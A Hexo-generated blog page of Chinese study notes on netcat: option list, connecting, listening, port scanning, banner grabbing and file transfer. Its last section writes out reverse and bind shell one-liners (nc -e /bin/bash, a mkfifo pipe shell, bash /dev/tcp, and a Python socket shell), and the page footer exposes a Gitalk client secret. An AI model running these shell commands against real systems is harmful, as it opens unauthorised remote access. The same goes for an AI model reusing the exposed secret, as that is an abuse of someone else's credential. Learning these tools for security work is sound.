@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html>
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  
+  <title>nc使用基础 - MINX&#39;s Blog</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+
+  <link rel="shortcut icon" href="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%B0%81%E9%9D%A2/head.png" type="image/png">
+  <meta name="description" content="nc的基础使用笔记参考：  http://niehan.blog.techweb.com.cn/archives/148.html https://blog.csdn.net/zhangxiao93/article/details/52705642">
+<meta property="og:type" content="article">
+<meta property="og:title" content="nc使用基础">
+<meta property="og:url" content="http://iminx.cn/2019/10/30/nc使用基础/index.html">
+<meta property="og:site_name" content="MINX&#39;s Blog">
+<meta property="og:description" content="nc的基础使用笔记参考：  http://niehan.blog.techweb.com.cn/archives/148.html https://blog.csdn.net/zhangxiao93/article/details/52705642">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-10-30T16:11:43.471Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="nc使用基础">
+<meta name="twitter:description" content="nc的基础使用笔记参考：  http://niehan.blog.techweb.com.cn/archives/148.html https://blog.csdn.net/zhangxiao93/article/details/52705642">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
+   
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
+  <link rel="stylesheet" href="/css/style.css?v=1572451955894">
+</head>
+
+<body class="mdui-drawer-body-left">
+  
+  <div class="nexmoe-bg" style="background-image: url(https://iminx.oss-cn-beijing.aliyuncs.com/%E5%B0%81%E9%9D%A2/4.jpg)"></div>
+  <div id="nexmoe-header">
+      <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/">
+            <img src="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%B0%81%E9%9D%A2/head.png">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>10</div>
+        <div><span>标签</span>0</div>
+        <div><span>分类</span>7</div>
+    </div>
+    <ul class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+    </ul>
+    <aside id="nexmoe-sidebar">
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">社交按钮</h3>
+    <div class="nexmoe-widget nexmoe-social">
+        <a class="mdui-ripple" href="https://github.com/clhclh1/clhclh1.github.io" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
+            <i class="nexmoefont icon-github"></i>
+        </a>
+    </div>
+</div>
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章分类</h3>
+    <div class="nexmoe-widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AWD/">AWD</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Bypass/">Bypass</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Docker/">Docker</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux基础命令/">Linux基础命令</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/SQL注入/">SQL注入</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Writeup/">Writeup</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/文件上传/">文件上传</a><span class="category-list-count">2</span></li></ul>
+    </div>
+  </div>
+
+
+  
+  
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章归档</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2019 MINX
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://nexmoe.com/hexo-theme-nexmoe.html" target="_blank">Nexmoe</a>
+    </div>
+</div><!-- .nexmoe-drawer -->
+
+<script>
+    const getRealPath = (pathname, desc = false) => {
+        if (!pathname) {
+            pathname = window.location.pathname
+        }
+        let names = pathname.split("/")
+        if (desc === false) {
+            for (let i = names.length - 1; i >= 0; --i) {
+                let name = names[i].trim()
+                if (name.length > 0 && name !== "/" && name !== "index.html") {
+                    return name
+                }
+            }
+        } else {
+            for (let i = 0; i < names.length; ++i) {
+                let name = names[i].trim()
+                if (name.length > 0 && name !== "/" && name !== "index.html") {
+                    return name
+                }
+            }
+        }
+        return "/"
+    }
+    let links = document.querySelectorAll('.nexmoe-list-item');
+    let rootRealPath = getRealPath(window.location.pathname, true);
+    for (let link of links) {
+        let linkPath = link.getAttribute("href");
+        if (linkPath && getRealPath(linkPath, true) === rootRealPath) {
+            link.className = "active nexmoe-list-item mdui-list-item mdui-ripple";
+        }
+    }
+</script>
+  </div>
+  <div id="nexmoe-content">
+    <div class="nexmoe-primary">
+        <div class="nexmoe-tab">
+            <a mdui-drawer="{target: '#drawer', swipe: true}">
+              <i class="mdui-icon material-icons">menu</i>
+            </a>
+          </div>
+        <div class="nexmoe-post">
+    <div class="nexmoe-post-cover"> 
+        
+        <img src="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%B0%81%E9%9D%A2/6.jpg">
+        
+        <h1>nc使用基础</h1>
+    </div>
+  <div class="nexmoe-post-meta">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2019年10月30日</a>
+    <a><i class="nexmoefont icon-areachart"></i>1,264 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 5 分钟</a>
+    
+      <a class="nexmoefont icon-appstore-fill -link" href="/categories/Linux基础命令/">Linux基础命令</a>
+    
+    
+  </div>
+  <article>
+    <p>nc的基础使用笔记<br>参考：</p>
+<ol>
+<li><a href="http://niehan.blog.techweb.com.cn/archives/148.html" target="_blank" rel="noopener">http://niehan.blog.techweb.com.cn/archives/148.html</a></li>
+<li><a href="https://blog.csdn.net/zhangxiao93/article/details/52705642" target="_blank" rel="noopener">https://blog.csdn.net/zhangxiao93/article/details/52705642</a></li>
+</ol>
+<a id="more"></a>
+<h1 id="nc简介"><a href="#nc简介" class="headerlink" title="nc简介"></a>nc简介</h1><p>　　nc是一款很不错的网络检测工具，以下是详细使用。</p>
+<p>　　’nc.exe -h’即可看到各参数的使用方法。</p>
+<p>　　基本格式：nc [-options] hostname port [ports] …</p>
+<p>　　nc -l -p port [options] [hostname] [port]</p>
+<p>　　-d 后台模式</p>
+<p>　　-e prog 程序重定向，一旦连接，就执行 [危险!!]</p>
+<p>　　-g gateway source-routing hop point, up to 8</p>
+<p>　　-G num source-routing pointer: 4, 8, 12, …</p>
+<p>　　-h 帮助信息</p>
+<p>　　-i secs 延时的间隔</p>
+<p>　　-l 监听模式，用于入站连接</p>
+<p>　　-L 连接关闭后,仍然继续监听</p>
+<p>　　-n 指定数字的IP地址，不能用hostname</p>
+<p>　　-o file 记录16进制的传输</p>
+<p>　　-p port 本地端口号</p>
+<p>　　-r 随机本地及远程端口</p>
+<p>　　-s addr 本地源地址</p>
+<p>　　-t 使用TELNET交互方式</p>
+<p>　　-u UDP模式</p>
+<p>　　-v 详细输出–用两个-v可得到更详细的内容</p>
+<p>　　-w secs timeout的时间</p>
+<p>　　-z 将输入输出关掉–用于扫描时</p>
+<p>　　端口的表示方法可写为M-N的范围格式。</p>
+<h1 id="连接远程主机"><a href="#连接远程主机" class="headerlink" title="连接远程主机"></a>连接远程主机</h1><p><code>nc -nvv 192.168.0.0 80</code></p>
+<h1 id="监听本地端口"><a href="#监听本地端口" class="headerlink" title="监听本地端口"></a>监听本地端口</h1><p><code>nc -lvp 80</code><br>或者<br><code>nc -l -p 80</code></p>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p><code>nc -z -v -n 127.0.0.1 21-25</code><br>可以运行在TCP或者UDP模式，默认是TCP，-u参数调整为udp.<br>z 参数告诉netcat使用0 IO,连接成功后立即关闭连接， 不进行数据交换</p>
+<p>v 参数指使用冗余选项（译者注：即详细输出）</p>
+<p>n 参数告诉netcat 不要使用DNS反向查询IP地址的域名</p>
+<p>这个命令会打印21到25 所有开放的端口。Banner是一个文本，Banner是一个你连接的服务发送给你的文本信息。当你试图鉴别漏洞或者服务的类型和版本的时候，Banner信息是非常有用的。但是，并不是所有的服务都会发送banner。</p>
+<p>一旦你发现开放的端口，你可以容易的使用netcat 连接服务抓取他们的banner。<br><code>nc -v 172.31.100.7 21</code><br>netcat 命令会连接开放端口21并且打印运行在这个端口上服务的banner信息。</p>
+<h1 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h1><p>假设，你想要传一个文件file.txt 从A 到B。A或者B都可以作为服务器或者客户端，以下，让A作为服务器，B为客户端。</p>
+<p>Server:<br><code>nc -l 1567 &lt; file.txt</code><br>Client:<br><code>nc -n 172.31.100.7 1567 &gt; file.txt</code><br>这里我们创建了一个服务器在A上并且重定向netcat的输入为文件file.txt，那么当任何成功连接到该端口，netcat会发送file的文件内容。<br>在客户端我们重定向输出到file.txt，当B连接到A，A发送文件内容，B保存文件内容到file.txt.</p>
+<p>没有必要创建文件源作为Server，我们也可以相反的方法使用。像下面的我们发送文件从B到A，但是服务器创建在A上，这次我们仅需要重定向netcat的输出并且重定向B的输入文件。</p>
+<p>B作为Server</p>
+<p>Server：<br><code>nc -l 1567 &gt; file.txt</code><br>Client:<br><code>nc 172.31.100.23 1567 &lt; file.txt</code></p>
+<h1 id="目录传输"><a href="#目录传输" class="headerlink" title="目录传输"></a>目录传输</h1><p>要想传输一个目录，就要先压缩再传输<br>服务端：<br><code>tar -cvf – dir_name| bzip2 -z | nc -l 1567</code><br>通过bzip2压缩<br>客户端：<br><code>nc -n 172.31.100.7 1567 | bzip2 -d |tar -xvf -</code><br>使用bzip2解压</p>
+<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><h3 id="nc反弹shell"><a href="#nc反弹shell" class="headerlink" title="nc反弹shell"></a>nc反弹shell</h3><ol>
+<li>假设你的netcat支持 -c -e 参数(默认 netcat)<br>服务端：<br><code>nc -l 1567 -e /bin/bash -i</code><br>客户端：<br><code>nc 172.31.100.7 1567</code></li>
+<li>假如netcat 不支持-c 或者 -e 参数（openbsd netcat）,我们仍然能够创建远程shell<br>服务端：<pre><code>$mkfifo /tmp/tmp_fifo
+$cat /tmp/tmp_fifo | /bin/sh -i 2&gt;&amp;1 | nc -l 1567 &gt; /tmp/tmp_fifo</code></pre>这里我们创建了一个fifo文件，然后使用管道命令把这个fifo文件内容定向到shell 2&gt;&amp;1中。是用来重定向标准错误输出和标准输出，然后管道到netcat 运行的端口1567上。至此，我们已经把netcat的输出重定向到fifo文件中。<br>说明：</li>
+</ol>
+<p>从网络收到的输入写到fifo文件中</p>
+<p>cat 命令读取fifo文件并且其内容发送给sh命令</p>
+<p>sh命令进程受到输入并把它写回到netcat。</p>
+<p>netcat 通过网络发送输出到client</p>
+<p>至于为什么会成功是因为管道使命令平行执行，fifo文件用来替代正常文件，因为fifo使读取等待而如果是一个普通文件，cat命令会尽快结束并开始读取空文件。</p>
+<p>在客户端仅仅简单连接到服务器<br>客户端：<br><code>$nc -n 172.31.100.7 1567</code><br>你会得到一个shell提示符在客户端</p>
+<h3 id="Linux命令反弹shell"><a href="#Linux命令反弹shell" class="headerlink" title="Linux命令反弹shell"></a>Linux命令反弹shell</h3><p>首先在服务器端执行反弹shell命令<br><code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code><br>然后在我们的客户端用nc监听：<br><code>nc -lvp 7777</code><br>就可以拿到反弹的shell</p>
+<h3 id="python反弹shell"><a href="#python反弹shell" class="headerlink" title="python反弹shell"></a>python反弹shell</h3><p><code>python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;ip&#39;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&quot;</code></p>
+
+  </article>
+  
+    
+<div class="nexmoe-post-copyright">
+<i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+<strong>本文作者：</strong>MINX<br>
+<strong>本文链接：</strong><a href="http://iminx.cn/2019/10/30/nc使用基础/" title="http://iminx.cn/2019/10/30/nc使用基础/" target="_blank" rel="noopener">http://iminx.cn/2019/10/30/nc使用基础/</a><br>
+
+  <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可 <br> <a href="http://www.miitbeian.gov.cn/">闽ICP备19007766号</a>
+
+</div>
+
+
+  
+  <section class="nexmoe-comment">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.css">
+<div id="gitalk"></div>
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+        clientID: '80b2453b6d5f37ad6225',
+        clientSecret: '43e99fa852795c9a7b3eb924b2558c64b84bbdeb',
+        id: window.location.pathname,
+        repo: 'nexmoe.github.io',
+        owner: 'nexmoe',
+        admin: 'nexmoe'
+    })
+    gitalk.render('gitalk')
+</script>
+</section>
+</div>
+    </div>
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/js/mdui.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+ 
+    <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+
+ 
+    <script src="https://cdn.jsdelivr.net/npm/smoothscroll-for-websites@1.4.9/SmoothScroll.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script src="/js/app.js?v=1572451955793"></script>
+<script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
+
+  
+
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
